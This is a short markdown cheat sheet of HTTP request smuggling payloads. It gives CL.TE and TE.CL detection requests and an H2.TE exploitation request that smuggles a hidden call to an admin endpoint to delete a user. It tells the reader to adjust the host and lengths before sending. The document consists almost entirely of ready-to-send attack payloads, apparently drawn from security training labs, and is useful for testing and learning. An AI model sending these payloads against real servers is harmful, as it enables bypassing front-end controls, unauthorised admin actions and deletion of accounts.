# summary
Usefull payloads about http request smuggling vulnerability.

**Note:** don't forget updating the host, content-length and chunke size before sending request. 

# payloads
## detection
### CL.TE timing technique
```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 4 

1 
A 
X
```

### <span>TE.CL</span> timing technique
```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 6 

0 

X
```

### CL.TE diffrent response techique
```
POST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 49 
Transfer-Encoding: chunked 

e 
q=smuggling&x= 
0 

GET /404 HTTP/1.1 
Foo: x
```

### <span>TE.CL</span> diffrent response technique
```
POST /search HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 4 
Transfer-Encoding: chunked 

7c 
GET /404 HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 144 

x= 
0
```

## exploitation
### H2.TE
```
POST / HTTP/2
Host: TARGET_HOST
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: TARGET_HOST
```
